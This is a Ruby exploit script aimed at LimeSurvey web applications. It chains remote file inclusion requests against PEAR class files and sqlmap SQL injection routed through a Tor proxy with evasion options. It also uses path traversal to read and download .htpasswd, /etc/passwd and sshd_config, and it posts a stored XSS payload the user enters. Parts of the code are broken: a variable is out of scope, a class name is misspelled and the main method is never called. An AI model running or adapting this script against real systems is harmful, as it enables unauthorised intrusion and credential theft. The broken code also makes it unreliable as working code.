#!/usr/bin/ruby
require 'httpclient'
require 'thread'
shell = "" 
host = ARGV[0]
def running 
	ur = host + "/admin/classes/pear/OLE/PPS/File.php?homedir=#{shell}"
	ew = host + "/admin/classes/pear/OLE/PPS/Root.php?homedir=#{shell}"	
	sa = host + "/admin/classes/pear/Spreadsheet/Excel/Writer.php?homedir=#{shell}"
	soo = host + "/admin/classes/pear/OLE/PPS.php?homedir=#{shell}"
	foo = host + "/admin/classes/pear/Spreadsheet/Excel/Writer/Worksheet.php?homedir=#{shell}"
	ba = host + "/admin/classes/pear/Spreadsheet/Excel/Writer/Parser.php?homedir=#{shell}"
	nom = host + "/admin/classes/pear/Spreadsheet/Excel/Writer/Workbook.php?homedir=#{shell}"
	mon = host + "/admin/classes/pear/Spreadsheet/Excel/Writer/Format.php?homedir=#{shell}"
	doh = host + "/admin/classes/pear/Spreadsheet/Excel/Writer/BIFFwriter.php?homedir=#{shell}"
	rq = HTTPClient.get(ur)
	puts rq.body 
	ewr = HTTPClient.get(ew) 
	puts ewr.body
	sars = HTTPClient.get(sa) 
	puts sars.body
	sor = HTTPClient.get(soo) 
	puts sor.body
	fogg = HTTPClient.get(foo)
	puts fogg.body
	bar = HTTPClient.get(ba) 
	puts bar.body
	noma = HTTPClient.get(nom) 
	puts noma.body
	mond = HTTPClient.get(mon) 
	puts mond.body
	dor = HTTPClienet.get(doh) 
	puts dor.body
	rfn = host + "/classes/core/language.php?rootdir=#{shell}"
	rfnig = HTTPClient.get(rfn) 
	puts rfnig.body 
	sql = "#{host}/index.php"
	te = `sqlmap -u #{sql}  --data "fieldnames=17165X6X18SQ001%7C17165X6X18SQ002%7C17165X6X18SQ003%7C17165X6X18SQ004%7C17165X6X18SQ005%7C17165X6X18SQ006%7C17165X6X18SQ007%7C17165X6X18other%7C17165X6X26SQ001%7C17165X6X26SQ002%7C17165X6X26SQ003*&srid=32*"--random-agent --proxy socks4://127.0.0.1:9050 --tamper likerandomcase > limesurveysq`
	lfie = host + "/admin/importsurvey.php?copyfunction=1&sExtension=lss&sFullFilepath=../../secret/.htpasswd"
	lfirq = HTTPClient.get(lfie)
	puts lfirq.body 
	if lfirq.code == 200 
		`wget #{lfie}`
		`wget #{host}/admin/importsurvey.php?copyfunction=1&sExtension=lss&sFullFilepath=../../etc/passwd`
		`wget #{host}/admin/importsurvey.php?copyfunction=1&sExtension=lss&sFullFilepath=../../../etc/ssh/sshd_config`
		puts "lfi is vulnerable /admin/importsurvey.php?copyfunction=1&sExtension=lss&sFullFilepath= snoop around"
	end
	
	puts "This is a persistent XSS link."
	puts "Input your XSS payload"
	xssp = STDIN.gets.chomp 
	xssln = host + "/limesurvey/index.php/admin/labels/sa/process"
	data = 'label_name=Zero+Science+Lab"' + xssp
	xssr = HTTPClient.post(xssln, data) 
	puts xssr.code 
	sqlu = host + "/limesurvey/index.php/admin/usergroups/sa/add"
	`echo #{sqlu} > limsurveyfile2`
	`sqlmap -u #{sqlu} --data "group_name=Zero+Science+Lab*&action=usergroupindb" --tamper likerandomcase --proxy socks4://127.0.0.1:9050 --random-agent >> limesurveyfile2`

end 	

